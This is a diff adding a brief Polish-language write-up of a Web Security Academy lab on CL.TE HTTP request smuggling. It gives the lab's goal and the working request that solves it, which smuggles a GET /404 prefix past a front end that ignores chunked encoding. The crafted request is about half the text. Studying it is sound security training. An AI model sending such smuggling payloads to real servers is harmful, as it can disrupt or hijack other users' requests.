@@ -1,0 +1,26 @@
+(https://0a5300a40400cfa2c07f3051008e005d.web-security-academy.net/)
+
+To laboratorium obejmuje serwer frontonu i serwera zaplecza, a serwer frontonu nie obsługuje kodowania fragmentarycznego.
+
+Aby rozwiązać laboratorium, przemytuj żądanie do serwera zaplecza, aby kolejne żądanie dla / (głównego serwera WWW) wywołało odpowiedź 404 Not Found.
+
+Ręczne naprawianie pól długości w atakach polegających na przemycie żądań może być trudne. Nasze rozszerzenie HTTP Request Smuggler Burp zostało 
+zaprojektowane, aby pomóc. Możesz go zainstalować za pośrednictwem BApp Store.
+
+
+
+
+[Request]
+POST / HTTP/1.1
+Host: 0a5300a40400cfa2c07f3051008e005d.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 39
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+
+
+[/Request]
